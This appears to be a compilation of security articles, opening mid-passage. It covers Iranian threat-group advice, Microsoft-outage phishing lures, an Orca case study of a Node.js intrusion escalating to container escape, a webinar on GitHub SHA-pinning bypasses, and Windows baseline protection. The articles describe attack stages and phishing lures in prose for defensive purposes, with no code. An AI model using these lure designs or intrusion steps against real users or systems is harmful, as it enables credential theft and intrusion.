Unexpected CVs, archives and external documents: The group has used a fake CV, healthcare-themed archives and malicious Word documents as initial lures. Recruiting teams and employees who regularly handle unsolicited external files deserve particular attention.

Unapproved remote management software: Volant Manticore has deployed NetLock RMM, N-able RMM and MeshCentral. Organizations should maintain an inventory of approved remote administration tools and investigate unexpected installations or connections.

Credential-harvesting activity: Researchers identified infrastructure designed to imitate corporate email and authentication services. Strong multi-factor authentication and monitoring for unusual authentication activity can help limit the impact of compromised credentials.

Suspicious PowerShell and network reconnaissance: KuboShell was used to perform reconnaissance before further payloads were deployed. Unexpected PowerShell activity, network discovery and queries relating to administrative access may indicate that an initial compromise has progressed.

Changes in regional threat activity: Organizations in aviation, telecommunications, healthcare, government and critical infrastructure should incorporate geopolitical developments into threat monitoring, particularly when their operations or partners are connected to areas of increasing regional tension.

Looking Ahead

Volant Manticore shows how Iran’s cyber ecosystem continues to reshape itself. What appears to be a group of former MuddyWater operators is developing its own malware and infrastructure while retaining parts of the tradecraft its operators used previously.

Its targeting may ultimately be the more important signal. The move from a sustained focus on Cyprus to intensified activity against Saudi Arabia demonstrates how quickly espionage priorities can change in response to regional developments.Future geopolitical developments could drive further shifts in the group’s targeting priorities.

Title: The Microsoft Outage Brought a Surge of Phishing Email
Context: 11 daily average in detections and about 187 times that average in user reports, across KnowBe4 Email & Collaboration Security (PhishER Plus and Defend)
Full Text:
Lead Analysts: Prabhakaran R, Jeewan Singh Jalal

When a service you rely on goes down, you look for answers, and attackers know it. After the Microsoft outage on Nov. 12, KnowBe4 Threat Lab observed a sharp rise in outage-related email.

Read on for what we found, what the lures looked like, and how to protect your organization.

Key Findings

The surge peaked on the second day of the outage. On Nov. 13, outage-related phishing emails reached about 468 times the Nov. 9 to Nov. 11 daily average in detections and about 187 times that average in user reports, across KnowBe4 Email & Collaboration Security (PhishER Plus and Defend).

The lures were built to look like Microsoft. The lures we reviewed used a held-messages notice, a fake security check, an Exchange service notice, and a Teams notification.

One lure cited Microsoft's real incident number. A correct incident number does not make an email genuine.

The goal appears to be sign-in access. All four emails appear designed to steal sign-in access, through credential harvesting or device code phishing.

What Happened in the Microsoft Outage?

On Thursday, Nov. 12, a global outage hit the networking gateway that fronts many Microsoft 365 services. According to Microsoft's preliminary post-incident report for incident MO1550821, dated Nov. 15, the incident ran from Nov. 12, 2026 to Nov. 13, 2026. It lasted nearly 24 hours and reached users around the world. Microsoft listed 14 affected services, including Exchange, Teams, SharePoint, OneDrive, and Copilot.

Exchange Online took the biggest hit. Most users could not reach their mailboxes, and email delivery was delayed for many. Microsoft said the outage came from a chain of events, not a single failure:

A hidden defect. A software fix deployed to the gateway servers in July contained a flaw that caused servers to stop responding under certain loads. It ran for more than three months without problems.

More load, less capacity. About 15 hours before the outage, Teams traffic moved to the gateway that also supports Exchange Online. At the same time, nearly 14% of server capacity was out of service for an unrelated reason.

A cascade. Servers that failed pushed traffic onto fewer healthy servers, which then failed too. At its lowest point, more than 80% of servers were unresponsive.

Teams, OneDrive, and SharePoint could move away from the gateway and partly recovered sooner. Exchange Online could not, so email stayed disrupted. Recovery took longer because servers that returned to service were overwhelmed again by waiting traffic. Microsoft also extended the email delivery window so delayed messages were not returned as undeliverable. The report is preliminary, and a final report will follow.

How Big Was the Surge in Outage-Themed Phishing Emails?

Phishing activity followed the outage. The peak came on the second day, Nov. 13, when outage-related email reached about 468 times the Nov. 9 to 11 daily average in detections and about 187 times that average in user reports.

What Did the Outage Lures Look Like?

We reviewed sender and subject patterns across all matched emails, and the message body of four examples. The first two use the subject "Outage -" plus a random string. The other two use different subjects.

Lure

What it says

What it wants

Held messages

Copies a Microsoft notice. Cites Microsoft's real incident number for the Nov. 12 outage, lists the affected services, and says four messages are held and will be deleted within 24 hours.

A click on "Restore Messages."

Fake security check

Claims to be from a support desk and says "1 security issue found on your account."

A click on "Take Action," the only button in the message.

Exchange service notice

Styled as Microsoft Support, with the subject "Action Required: Microsoft Exchange Service Interruption" and a date. Refers to "our recent server outage" and asks you to update your email to avoid further disruption.

A click on "Update Email Now," pushed by a red "ACTION REQUIRED NOW!" banner.

Teams notification

Looks like a Microsoft Planner task notification assigning you a document to review. The subject is "Due To Microsoft Error Early- Access Doc" plus a code. It presents itself as a workaround for the Microsoft error, with an access code to "enter when prompted" that expires in 30 minutes.

A click on "Open in browser" or "Open in Teams," then entering the code.

This lure cites Microsoft's real incident number and warns that held messages will be deleted within 24 hours. The deadline and the "Restore Messages" button are meant to push a quick click.

This lure states that it comes from a "support desk" rather than Microsoft and claims "1 security issue found on your account." It has a single button, "Take Action," so there is only one place to click.

The Exchange notice has odd wording, such as "We've detect a refresh issue," which is a sign it is not genuine.

This lure imitates a Planner task notification and offers a "workaround" for the Microsoft error.

Why Do These Lures Work?

They match what people expect during an outage.

The failure was real. Mail delivery did fail, so a warning about held messages sounds plausible.

A security check feels natural. Users are already checking their accounts.

A Teams notice sounds like a sensible workaround. Email is down, so another route-in seems reasonable.

All four emails appear designed to steal your sign-in access, through credential harvesting or device code phishing.

How Can You Stay Vigilant?

Outages make people more willing to click. Build these habits before the next one:

Go to the source. Check Microsoft's official service status page or your IT team's usual channel. Do not rely on a link in an email. A real incident number can appear in a fake notice, so a correct number does not prove an email is genuine.

Treat sign-in prompts and deadlines with care. A request to "restore messages" or log in to "restore access" is more believable when services are failing. Never enter a sign-in code from an email or a Teams notice unless you started that sign-in yourself. Open the service directly instead.

Verify new contact details. Confirm any change in contact details sent during an outage with a contact you already know.

Look for odd subjects and wording. Random strings, typos, urgent red warnings, and unfamiliar senders are all signs to pause.

Question workarounds. Be wary of any message that offers another way in while Microsoft is down, such as a task, a document, or a Teams link. Confirm it with your IT team.

Report, don't click. If an email looks wrong, use your report button instead of clicking. Your security team can then spot the attack early and act on it.

Security teams should also watch for newly seen domains that send large volumes in a short time.

How Does KnowBe4 Email & Collaboration Security Help?

You cannot stop an outage. You can limit what attackers gain from one.

KnowBe4 Email & Collaboration Security brings together KnowBe4 Defend (inbound email and messaging security), KnowBe4 Prevent (outbound email security), and PhishER Plus (incident response).

In this event, Defend detected outage-themed phishing emails as threats. PhishER helps your team act on what users report: it classifies reported messages, gives reporters instant feedback, and lets you remediate threats across every inbox with one click.

Training closes the gap. Security Awareness Training and Real-Time Coaching help your users spot urgent, outage-themed lures before they click.

Be Ready Before the Next Outage

Outages end. The habits you build for them endure. Start by asking your team one question today: where would you check first if email went down?

Title: Caught by Behavior: How Orca Sensor Exposed a Cloud Intrusion in Real Time
Context: From the exploited web app to the second wave, the attack raised Critical and High alerts in the customer’s Orca console as it unfolded, with the detections running in alert mode
Full Text:
Executive summary: Runtime behavior exposed what indicators missed

No known indicator flagged this attack. Orca Sensor did, in real time.

A CVE in a scanned package, a malware hash, a bad IP address or domain: known signals like these catch known threats. This intrusion brought none of them, so threat intelligence and CVE scanning had nothing to flag for what the attacker used. What gave it away was behavior.

Orca Sensor flagged the shell commands the exploited web app started, through its Node.js remote code execution (RCE) detections, and kept flagging the attacker’s activity as it spread. In total, 18 behavioral detections fired, spanning seven MITRE ATT&CK tactics, and none of them relied on a known hash, IP address, domain, or CVE. From the exploited web app to the second wave, the attack raised Critical and High alerts in the customer’s Orca console as it unfolded, with the detections running in alert mode.

Orca’s research team spotted the activity in the sensor data and proactively reached out to the customer to share the full picture of the attack and help their team scope and contain it.

Where known indicators go silent, behavior speaks

Orca Sensor is a lightweight eBPF sensor for runtime detection and response. It watches processes, files and network activity on hosts and in containers as they happen.

This attacker brought nothing known:

No hash to match. The binary they ran was not flagged by threat intelligence.

No IP or domain to match. Neither the domain the binary was downloaded from nor the external address used in a reverse shell attempt was flagged by threat intelligence.

No untrusted image. The containers they started used images from the company’s own private registry, so an image allowlist alone would not have blocked them.

No CVE to scan for. The activity matched a flaw in the web app that had no public CVE at the time.

What the attacker could not hide was behavior, and behavior is what the sensor watches.

Known signals like these only work once someone has already seen that attacker or that flaw. Behavior describes what an attacker does, and that is much harder to change. Attackers can swap their tools, servers and entry points, but the steps they need stay the same: run commands, look for credentials, ask the cloud metadata service for access, try to break out of containers, and set up a way back in.

That is why the detections that fired here were not written for this attacker or this flaw. They describe techniques, and they fired because the attacker used them. And runtime is where those steps happen, so the sensor sees what the attacker does, even when there is nothing known to match.

As more attackers turn to AI agents that tailor their tools to every target and find flaws no one has reported yet, every attack can look brand new. Their behavior is what still gives them away.

Attack timeline: From Node.js RCE to container escape and persistence

Code execution in the web app. A self-hosted web app built on Node.js, running as root, started a shell that ran system recon commands. Two Node.js RCE detections fired on that first command, and a third fired minutes later when the attacker dropped a script in /tmp and ran it. In this environment, these detections fired only on the attack, not on the app’s normal activity. Every later alert on that server traced back to the app’s own process.

Recon and secret hunting. Next, the sensor caught searches for SSH keys and cloud credential files, scans for etcd and the kubelet API, and requests to the cloud metadata service for the temporary credentials it can issue to a workload.

Moving into other services. The attacker then ran commands inside other application containers, among them base64-encoded Python scripts that collected environment variables and listed running processes. In several containers, they also ran a hidden binary from /tmp that deleted itself right after it started.

Breaking out to the host. The attacker started privileged containers that shared the host’s process namespace and mounted its filesystem, and used them to enter the host’s namespaces. On one host, they installed a copy of that binary under a disguised name, which then launched more privileged containers. They also tried to install system services to come back after a reboot.

A second wave. After a quiet period, new containers appeared on hosts that had not been touched before. They downloaded the attacker’s binary and ran it. The same kind of behavioral detections caught the new activity, from reverse shell attempts to fresh requests for cloud credentials.

Across the intrusion, 18 detections fired, spanning seven MITRE ATT&CK tactics:

Tactic

What the sensor caught

Execution

A web app starting shells that ran recon commands, a script dropped in /tmp and run, base64-encoded Python scripts, reverse shell attempts

Discovery

Commands checking which user was running inside a container, and connections probing internal services such as etcd, to map what else could be reached

Credential access

Searches for SSH keys and cloud credential files, running an application’s own code to pull its stored secrets, requests to the cloud metadata service

Privilege escalation

Entering the host’s namespaces and starting privileged containers

Defense evasion

Hidden files in /tmp and a binary named like a kernel process that deleted itself right after it started, both ways to stay out of sight on disk

Persistence

Privileged containers set to restart automatically, and attempts to enable system services from inside a container, all ways to keep or regain access

Lateral movement

Connections from shells and scripts inside containers to the kubelet API on several hosts, probing for a way to reach other workloads

How process tree context tied every alert to the attacker

The alerts carried the command line and the process tree behind each event, along with the host and the Linux user. For containers, they also carried the container name, image, and registry, and whether the container was privileged. That context is what turned separate alerts into one story. A credential search or a request to the metadata service did not stand alone: its process tree showed what had started it, whether that was an application’s own process or a binary the attacker had planted.

The self-deleting binary is a good example: deleting the file does not stop the running program, so the sensor still recorded it as the parent of the commands that followed, which tied activity across many hosts back to the same tool.

From the sensor data, the research team rebuilt the attack from the first alert onward, decoded the attacker’s base64-encoded scripts, and mapped the containers and hosts involved.

One of the Node.js RCE alerts as it appeared in the Orca platform. The process tree shows the web app’s own Node.js process starting a shell that ran system recon commands as root. Identifying details and parts of the attacker’s commands are redacted.

How real-time detection shaped the incident response

Seeing the attack at an early stage shaped everything that followed. With those early and detailed alerts arriving in real time in the customer’s console, the research team used the same sensor data to piece the attack together as it unfolded, instead of working backward from a later alert. That meant they could reach out with the full picture while the attack was still in progress.

The customer confirmed that no red team or penetration test was running. The team shared a timeline built from the sensor’s alerts, along with the affected containers and hosts, the files the attacker dropped, the domain and address they used, the persistence they left behind (system services and auto-restarting containers), and which secrets may have been exposed, to help the customer’s team scope and contain the activity. Using that picture, the customer’s team contained the attack, removing the persistence and the attacker’s containers.

Runtime alerts live on the same platform as Orca’s cloud posture, identity, and vulnerability data. As a result, each alert appeared on the affected asset next to its exposure, vulnerabilities, and access, so the team saw the attack in full context in one place.

How to harden cloud workloads against similar attacks

A few practical steps make each stage of an attack like this harder:

Run web apps with least privilege. Run them as a non-root user, with a read-only filesystem where possible, so a compromised app can’t easily drop and run its own tools.

Limit access to the cloud metadata service. Block it for workloads that don’t need it, so a compromised container can’t collect cloud credentials.

Keep long-lived secrets out of environment variables and files. Prefer short-lived credentials and a secrets manager, so a shell in the app finds little worth stealing.

Block privileged containers and host namespace sharing. Allow them only where a workload truly needs them, and enforce that with policy rather than convention.

Restrict access to cluster control services. Limit which workloads can reach etcd and the kubelet API, and disable anonymous kubelet access, so a shell in one container can’t easily map or control the rest of the cluster.

Control outbound traffic. Let workloads reach only the destinations they need, which makes it much harder for an attacker to download tools or open a reverse shell.

Watch behavior, not just indicators. Activity that breaks a workload’s normal pattern, such as a web app starting shells or a container running a newly dropped binary, can expose an attack even when nothing known is involved. Alert on it, and for high-confidence detections, consider stopping it as it happens.

Detecting and stopping runtime attacks with Orca Sensor

Orca Sensor goes beyond known indicators: even when an attacker brings nothing known, their behavior gives them away. In this intrusion, the detections fired across the attack, from the exploited web app to recon and secret hunting, credential access, the break-out from containers to their hosts, and persistence. Seeing the attack never depended on a single alert, and together the alerts told the story of how it unfolded. Orca’s Threat Investigator Agent can reconstruct that story automatically from the alerts and their context. In alert mode, the sensor caught this attack. Set to terminate, the same detections that raised these alerts can stop the malicious processes as they run, not just flag them, including the Node.js RCE detections that fired before the attacker reached the host.

Title: Hackers Found a Way Around GitHub SHA Pinning. This Webinar Explains How to Close the Gap
Context: Attackers have already found a way around it
Full Text:
Pinning GitHub Actions to an exact version of their code, known as SHA pinning, has become the go-to defense against software supply chain attacks. Attackers have already found a way around it.

In March 2026, the hackers who hijacked Trivy, a widely used open-source security scanner, planted malicious code that looked like it came from GitHub's official checkout tool. They even labeled it a security fix. Teams pinned to it would have passed every check.

The trick works because GitHub lets copies of a project, called forks, share code with the original. In May, the same technique hit the popular actions-cool/issues-helper tool, stealing credentials from the pipelines that ran it.

The lesson: pinning guarantees the code won't change, but not who wrote it.

That gap is the focus of an upcoming webinar, GitHub Actions Security Beyond SHA Pinning. If your team treats pinning as the finish line, save your seat to learn what it actually protects you from, and what it doesn't.

Immutability Is Not Provenance

Pinning earned its reputation. When the tj-actions/changed-files compromise repointed tags to a malicious commit across more than 23,000 repositories in March 2025, teams that had pinned to SHAs were unaffected.

GitHub now lets administrators enforce pinning as an organization-wide policy, and few security teams argue against it.

📅 Save Your Spot: Learn Why “Best Practice” Won’t Stop the Next GitHub Actions Attack

But a pinned SHA leaves three questions unanswered:

Authorship: A SHA doesn't tell you who wrote the commit. Any fork commit can be pinned.

Project membership: Org-level enforcement checks that a reference is a 40-character SHA, not that the commit actually lives in the upstream project.

Runtime: A Docker-based action pinned to a SHA can still build its image at runtime, pulling in dependencies that were never frozen.

With agentic development pushing more code through CI than ever, each of those gaps gets exercised more often and reviewed less closely.

GitHub's Lockfiles Help. They Don't Finish the Job.

GitHub's 2026 Actions security roadmap, published March 26, put deterministic dependency locking front and center. Workflow lockfiles entered public preview on October 14 and became generally available on October 28, 2026. They tie every run to recorded commits for actions and their transitive dependencies, even if a tag moves later.

That's real progress. Locked commits must exist on a branch of the source repository, which blunts fork-only impostors. But GitHub's own changelog is clear that locking "does not determine whether the dependency itself is safe." Commit authorship and runtime builds remain open; immutable releases only help when maintainers opt in, and lockfiles aren't currently supported on GitHub Enterprise Server.

Not sure where your pipelines fall in that gap? Register for the webinar for a clear-eyed breakdown of what GitHub's roadmap fixes and what it still leaves to you.

What You'll Learn

Led by Erika Heidi, Staff Developer Relations Engineer at Chainguard, the session draws a hard line between immutability and provenance, and covers:

What org-level pin enforcement actually verifies, and the false confidence it can create

How impostor commits work, and why GitHub's repository network makes them possible

What GitHub's Actions roadmap addresses, and what it doesn't

Other ways to close the trust gap, including a curated catalog of vetted actions

Who Should Attend

Platform and DevOps engineers who own CI/CD, AppSec and DevSecOps teams writing pipeline policy, and security leaders who signed off on SHA pinning as "done." If your workflows pull in third-party actions, this session is for you.

Attackers have already shown they can disguise a malicious commit as a hardening fix. The next one won't announce itself either.

Register now for GitHub Actions Security Beyond SHA Pinning, pick the session time that works for you, and find out what your pins aren't telling you.

In this article

Microsoft plans to bring eight Windows security checks together in 2027

Windows baseline protection will flag missing safeguards and let you turn some on with one click

Apps could use the result to warn you, limit features, or block access

Microsoft announced plans to introduce Windows baseline protection, a feature that brings eight existing safeguards together into a single, verifiable security status.

With the feature expected to become generally available in 2027, Microsoft wants to make a familiar Windows security problem less confusing. Your PC has a collection of built-in protections, but working out which ones are enabled and what to do when they aren’t can take some digging.

Windows baseline protection will show you what’s missing and help you fix it. It will also give software developers a simpler way to check whether your computer meets their requirements and decide whether to let an app run at all.

On the positive side, that could make security easier to manage. But it could also mean more encounters with software that says your PC isn’t secure enough to use it.

The protections already exist in Windows. What’s new is the way Windows evaluates them together and shares the result. For people using personal or unmanaged PCs, the most immediately useful change may be the explanation that comes with the result.

Microsoft says the new baseline protection page in Windows Settings will show which protections are missing.

Preview of Windows baseline protection in Settings (image courtesy of Microsoft)

Where possible, a single button will enable the missing protections and restart the computer. If you need to change your PC’s firmware settings, for example to enable Secure Boot or the Trusted Platform Module (TPM), Windows will provide guidance.

The first version checks these eight requirements:

Security processor: Dedicated hardware, such as a TPM, that helps protect sensitive information.

Secure Boot: Protection against malicious software loading during startup.

Virtualization-based security: Hardware-assisted isolation that helps protect critical processes.

Memory integrity: Protection against malicious code running in protected parts of Windows.

Signed drivers only: A requirement that drivers have digital signatures.

Windows-certified drivers: A requirement that drivers meet Windows hardware signing requirements.

Kernel debugger protection: Restrictions that help prevent debugging tools from bypassing Windows security protections.

Vulnerable driver protection: Protection against known vulnerable drivers that could weaken the system’s security.

An application that wants to check a computer’s security configuration can use Windows’ baseline protection signal instead of maintaining its own collection of checks.

The intended uses are straightforward. An exam service might want to verify a student’s device before a test. A game might check protections relevant to anti-cheat measures. An organization might require a device to meet its security requirements before granting access.

Main takeaways

Windows baseline protection brings existing safeguards together into a common, hardware-backed security assessment and helps users enable any missing protections. That could make Windows security less confusing, but it also gives software vendors a simpler way to warn users, restrict features, or deny access when a computer falls short.

The developer decides what happens next. Will they require the entire baseline, or only the protections their application actually needs?

Windows baseline protection and security software such as Malwarebytes address different parts of the problem. Microsoft’s checks establish whether a set of underlying Windows safeguards is enabled. Malwarebytes Premium Plus adds protection against threats such as malware, ransomware, exploits, and malicious websites, along with browser protection and a VPN. Neither replaces the other: Installing security software does not switch on a missing Windows safeguard, and passing Microsoft’s checklist is not a guarantee that your PC is free of malware.

The feature is still in preview, and Microsoft says feedback will shape it before general availability.
